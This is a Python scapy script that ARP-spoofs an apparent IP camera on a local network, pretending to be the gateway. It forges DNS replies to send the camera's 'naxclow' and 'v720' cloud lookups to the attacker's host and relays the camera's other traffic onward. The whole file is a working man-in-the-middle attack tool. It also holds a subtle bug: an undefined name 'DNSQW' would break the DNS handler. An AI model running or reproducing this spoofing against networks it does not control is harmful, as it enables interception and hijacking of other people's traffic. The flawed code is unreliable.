import time, threading, os
from scapy.all import conf, ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR, send, sendp, sniff, getmacbyip

CAM_IP = "192.168.2.28"
HOST_IP = "192.168.2.22"
GATEWAY_IP = "192.168.2.1"
IFACE = "Wi-Fi"

conf.verb = 0

def get_mac_retry(ip):
    for _ in range(10):
        m = getmacbyip(ip)
        if m:
            return m
        time.sleep(1)
    return None

print(f"[*] Resolving MAC addresses for camera {CAM_IP} and gateway {GATEWAY_IP}...")
cam_mac = get_mac_retry(CAM_IP)
gw_mac = get_mac_retry(GATEWAY_IP)

if not cam_mac or not gw_mac:
    print("[!] Could not resolve camera or gateway MAC. Make sure the camera is powered on.")
    os._exit(1)

print(f"[+] Camera MAC:{cam_mac} | Gateway MAC:{gw_mac}")

def arp_loop():
    pkt = Ether(dst=cam_mac) / ARP(op=2, psrc=GATEWAY_IP, pdst=CAM_IP, hwdst=cam_mac)
    while True:
        sendp(pkt, iface=IFACE)
        time.sleep(2)

def handle_packet(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[IP].src == CAM_IP:
        qname = pkt[DNSQW].qname.decode(errors="ignore")
        if "naxclow" in qname.lower() or "v720" in qname.lower():
            resp = (
                Ether(dst=pkt[Ether].src) 
                / IP(src=pkt[IP].dst, dst=pkt[IP].src) 
                / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) 
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=HOST_IP),
                )
            )
            sendp(resp, iface=IFACE)
            print(f"[+] Redirected {qname} -> {HOST_IP}")
            return
    if pkt.haslayer(IP) and pkt[IP].src == CAM_IP and pkt[IP].dst != HOST_IP:
        pkt[Ether].dst = gw_mac
        sendp(pkt, iface=IFACE)

threading.Thread(target=arp_loop, daemon=True).start()
print(f"[*] DNS/ARP redirect active for {CAM_IP}. Waiting for camera requests...")
sniff(iface=IFACE, filter=f"ip host {CAM_IP}", prn=handle_packet, store=0)

